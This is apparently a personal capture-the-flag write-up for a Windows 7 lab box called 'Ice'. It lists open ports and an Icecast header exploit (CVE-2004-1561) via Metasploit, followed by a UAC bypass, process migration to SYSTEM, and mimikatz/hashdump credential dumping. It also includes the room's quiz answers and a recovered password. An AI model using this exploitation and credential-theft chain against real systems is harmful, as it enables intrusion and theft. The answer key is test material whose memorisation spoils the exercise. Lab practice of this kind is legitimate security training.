# ICE 

# DATE - Software_user , Thursday, 9 July 2020 04:25am

# IP - `10.10.236.130`

# Scanning

# NMAP - 

"""
`WINDOWS 7 box scan reveals`

135
139
445
3389
5357
8000
49152
49153
49154
49158
49159
49160

""" 	
# Intresting -

Icecast streaming media server is running 

exploiting.

# msf shell -

"""

`Server name - Dark-PC\Dark`

confirmed its windows 7 and x64 bit {box}

"""

"Using  post/multi/recon/local_exploit_suggester "

# local exploit suggester -

"""
exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
exploit/windows/local/ikeext_service: The target appears to be vulnerable.
exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.

"""

# Answers -

1. """
Execute Code Overflow 
CVE-2004-1561
use exploit windows/http/icecast_header
RHOSTS
"""
2. """
meterpreter
getuid - DARK
7601
x64
exploit/windows/local/bypassuac_eventvwr
lhost 
SeTakeOwnershipPrivilege
"""
3. """
spoolsv.exe
NT AUTHORITY\SYSTEM
creds_all

"""
4. """
hashdump 
screenshare 
record_mic
timestomp 
golden_ticket_create
"""

# Priv esc - 
"""
`exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.`

exploited .

"""


# Migrating - 

"""
migrating the service 

`service - spoolsv.exe `

got shell as ROOT {Administrator}
got creds using mimikatz (
 
 used kiwi extensions and used creds_all

)

# Creds 
DARK-PC - Password01!

using hashdump got all hashes

that was easy box pretty intresting :-)